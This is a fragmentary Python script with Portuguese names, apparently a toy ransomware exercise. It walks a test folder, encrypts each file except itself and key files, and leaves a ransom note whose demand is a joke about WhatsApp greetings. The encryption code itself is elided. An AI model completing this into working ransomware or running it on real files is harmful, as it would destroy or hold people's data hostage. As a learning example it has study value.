...
def encontrar_arquivos(diretorio):
    ...
    for raiz,  _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            ...
            if nome != "rans.py" and not nome.endswith(".key"):
...
def criar_mensagem_resgate():
    with open("leia.txt", "w") as f:
        ...
        f.write("Envia uma mensagem de bom dia para todos os seus contatos do whatsapp!\n")
...
def main():
    ...
    arquivos = encontrar_arquivos("teste_projeto_files")
    for arquivo in arquivos:
        criptografar_arquivo(arquivo, chave)
        print(arquivo, chave)
    criar_mensagem_resgate()
    print("Rans executado!")
